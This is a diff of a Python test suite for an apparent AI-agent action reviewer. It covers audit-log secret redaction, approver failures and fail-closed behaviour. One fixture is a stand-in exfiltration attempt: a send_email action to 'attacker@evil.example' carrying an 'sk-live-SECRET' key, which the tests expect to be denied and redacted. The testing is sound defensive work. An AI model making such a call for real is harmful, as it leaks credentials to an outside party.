@@ -73,19 +73,43 @@ def test_live_transfer_is_irreversible(tmp_path):
     assert result.policy.rule == "approve_irreversible"
 
 
-def test_audit_redacts_secret_arguments(tmp_path):
-    reviewer, audit_path = _reviewer(tmp_path, approver=auto_deny)
+def test_nested_secret_arguments_are_redacted(tmp_path):
+    reviewer, audit_path = _reviewer(tmp_path)
     result = reviewer.review(
         build_action(
             "send_email",
-            {"to": "attacker@evil.example", "subject": "Status", "body": "sk-live-SECRET"},
+            {
+                "to": "attacker@evil.example",
+                "subject": "Status",
+                "body": {"html": "sk-live-SECRET"},
+            },
         )
     )
 
     assert result.final_decision == Decision.DENY
     record = _record(audit_path)
-    assert record["args"]["subject"] == "Status"
     assert record["args"]["body"].startswith("[redacted ")
+    assert record["args_redacted"] is True
+    assert "sk-live-SECRET" not in audit_path.read_text(encoding="utf-8")
+
+
+def test_reason_and_error_text_are_redacted(tmp_path):
+    policy = Policy(
+        rules=(
+            Rule(
+                name="numeric_token",
+                decision=Decision.DENY,
+                when={"args.token": {"gt": 1}},
+            ),
+        ),
+        default_decision=Decision.ALLOW,
+    )
+    reviewer, audit_path = _reviewer(tmp_path, policy=policy)
+    result = reviewer.review(Action(tool="x", args={"token": "sk-live-SECRET"}))
+
+    assert result.final_decision == Decision.DENY
+    record = _record(audit_path)
+    assert record["args"]["token"].startswith("[redacted ")
     assert record["args_redacted"] is True
     assert "sk-live-SECRET" not in audit_path.read_text(encoding="utf-8")
 
@@ -129,9 +153,19 @@ def test_approver_contract_violation_is_denied(tmp_path):
     assert result.final_decision == Decision.DENY
     assert result.error is not None
     assert "expected Approval" in result.error
+    assert _record(audit_path)["error"] is not None
 
-    record = _record(audit_path)
-    assert record["error"] is not None
+
+def test_invalid_approval_is_denied(tmp_path):
+    def invalid_approver(action, result):
+        return Approval(approved="false", approver="llm")
+
+    reviewer, audit_path = _reviewer(tmp_path, approver=invalid_approver)
+    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))
+
+    assert result.final_decision == Decision.DENY
+    assert result.error is not None
+    assert _record(audit_path)["error"] is not None
 
 
 def test_async_approver_is_denied(tmp_path):
@@ -156,9 +190,20 @@ def test_approver_exception_is_denied(tmp_path):
     assert result.final_decision == Decision.DENY
     assert result.error is not None
     assert "no approver available" in result.error
+    assert _record(audit_path)["error"] is not None
 
-    record = _record(audit_path)
-    assert record["error"] is not None
+
+def test_approver_mutation_does_not_change_audit(tmp_path):
+    def mutating_approver(action, result):
+        action.args["amount"] = 1
+        return Approval(approved=True, approver="mutator")
+
+    reviewer, audit_path = _reviewer(tmp_path, approver=mutating_approver)
+    result = reviewer.review(build_action("transfer_funds", {"amount": 5000, "to": "treasury"}))
+
+    assert result.final_decision == Decision.ALLOW
+    assert result.action.args["amount"] == 5000
+    assert _record(audit_path)["args"]["amount"] == 5000
 
 
 def test_audit_write_failure_fails_closed(tmp_path):
@@ -168,3 +213,31 @@ def test_audit_write_failure_fails_closed(tmp_path):
     assert result.final_decision == Decision.DENY
     assert result.error is not None
     assert "Audit write failed" in result.error
+
+
+def test_non_oserror_audit_failure_fails_closed(tmp_path):
+    class BrokenAudit:
+        def log(self, record):
+            raise ValueError("cannot serialise")
+
+    reviewer = ActionReviewer(POLICY, BrokenAudit())
+    result = reviewer.review(build_action("read_file", {"path": "notes.txt"}))
+
+    assert result.final_decision == Decision.DENY
+    assert result.error is not None
+    assert "Audit write failed" in result.error
+
+
+def test_unserializable_arguments_do_not_escape(tmp_path):
+    for index, args in enumerate(
+        [
+            {"path": "notes.txt", "subject": "\ud800"},
+            {1: "x"},
+            {b"x": "y"},
+        ]
+    ):
+        audit_path = tmp_path / f"audit-{index}.jsonl"
+        reviewer = ActionReviewer(POLICY, AuditLogger(audit_path))
+        result = reviewer.review(Action(tool="read_file", args=args))
+        assert result.final_decision == Decision.ALLOW
+        json.loads(audit_path.read_text(encoding="utf-8").strip())
